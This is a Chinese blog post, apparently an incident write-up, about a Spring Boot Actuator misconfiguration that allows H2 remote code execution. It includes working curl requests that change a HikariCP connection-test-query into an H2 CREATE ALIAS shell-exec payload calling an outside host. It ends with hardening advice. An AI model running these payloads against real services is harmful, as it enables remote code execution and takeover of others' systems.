---
layout:     post
title:      2023-02-23-SpringBoot Actuator配置不当导致的H2 RCE漏洞
subtitle:   RCE漏洞
date:       2020-07-02
author:     KC
header-img: img/post-bg-debug.png
catalog: true
tags:
    - SpringBoot
    - Actuator
    - RCE漏洞
    - H2 RCE
---

> 聊一下由于SpringBoot Actuator配置不当导致的H2 RCE漏洞

### 背景

近期公司生产环境服务器发现了某个SpringBoot服务由于每次获取数据库连接报错导致服务发生了不可用现象,经过一段时间的排查分析发现了该问题与H2 RCE漏洞有关,遂记录下该问题复现的过程以及出现的一些必要条件。


### 漏洞概述
远程代码执行 （RCE） 是一类软件安全缺陷/漏洞。可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。

#### 案发现场
![](http://www.kcblog.cn/img/2023-02-23/1.jpg)
项目频繁打印上图所示的报错,导致了该服务触发了Hystrix服务降级,进而导致服务完全不可用。
经过排查发现该项目添加了如下配置

```yaml
management:
  endpoints:
    web:
      exposure:
        include: "*" #暴露所有节点
  endpoint:
    health:
      show-details: ALWAYS  #显示详细信息
```

该配置是SpringBoot Actuator的配置，主要作用是暴露该项目所有的actuator相关的访问端口和访问路径。通过一些特定的端口路径可以直接访问到SpringBoot项目内的各种配置参数和环境变量以及对它们进行修改，这种方式如果使用不当可能会造成信息泄露、H2 RCE漏洞等严重的安全隐患。根据上图中的报错日志基本可以确定是SpringBoot Actuator的配置不当导致了H2 RCE安全漏洞。

#### 问题复现

本地服务器在不更改SpringBoot Actuator配置的情况下部署相同的服务实例,如下图所示
![](http://www.kcblog.cn/img/2023-02-23/2.jpg)
可以看到通过actuator/env端口直接查看到该服务的一些核心配置,如mysql数据库等

###### 发送如下POST请求修改该项目spring.datasource.hikari.connection-test-query的值

```shell
curl --location 'http://192.168.10.60:9095/actuator/env' \
--header 'Content-Type: application/json' \
--data '{
    "name": "spring.datasource.hikari.connection-test-query",
    "value": "CREATE ALIAS EXEC AS '\''String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'\''; CALL EXEC('\''curl 192.168.1.188'\'');"
}'
```

再次刷新actuator/env页面发现spring.datasource.hikari.connection-test-query的值已经被成功修改,这个时候配置并不会立即生效,需要通过刷新接口使配置生效

![](http://www.kcblog.cn/img/2023-02-23/3.jpg)

###### 最后一步，向端点 /actuator/refresh 发送POST请求，使刚才修改的配置生效。

```shell
curl --location --request POST 'http://192.168.10.60:9095/actuator/refresh'
```

接下来随便请求该项目的任意接口执行sql之前都会出现案发现场图中提示的报错，进而导致服务不可用。

#### 原理

> HikariCP中的`connectionTestQuery`配置意义是在从池中给出一个连接之前被执行的query，也就是该属性下配置的query语句。 当攻击者通过Actuator漏洞成功修改了spring.datasource.hikari.connection-test-query属性之后，每次获取数据库连接时都会先执行该属性下配置的sql语句，然后利用SQL语句中的用户自定义函数，进行RCE。
>
> 在H2中有一个非常重要的命令，与PostgreSQL中的用户定义函数相似，可以用CREATE ALIAS创建一个java函数然后调用它，示例如下:
>
> ```sql
> CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
> CALL GET_SYSTEM_PROPERTY('java.class.path');
> ```
>
> 仿照这个，创建命令执行的java函数可以如下:
>
> ```java
> String shellexec(String cmd) throws java.io.IOException { 
>     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());
>     if (s.hasNext()) {
>         return s.next();
>     } throw new IllegalArgumentException(); 
> }
> ```
>
> 那么RCE所需的SQL语句即:
>
> ```sql
> CREATE ALIAS EXEC AS "String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}";
> CALL EXEC('curl 192.168.1.188');
> ```

万幸的是我们服务器中没有使用到H2数据库，只是会导致每次执行RCE语句时报错，没有造成太大损失。

#### 总结

尽量不要将SpringBoot服务Actuator的所有端口暴露出来，假如真的要用的话要保证该服务对应的端口不要直接暴露在外网环境中，同时可以开启security功能，配置访问权限验证，类似配置如下：

```properties
management.security.enabled=true
security.user.name=xxxxx
security.user.password=xxxxx
```

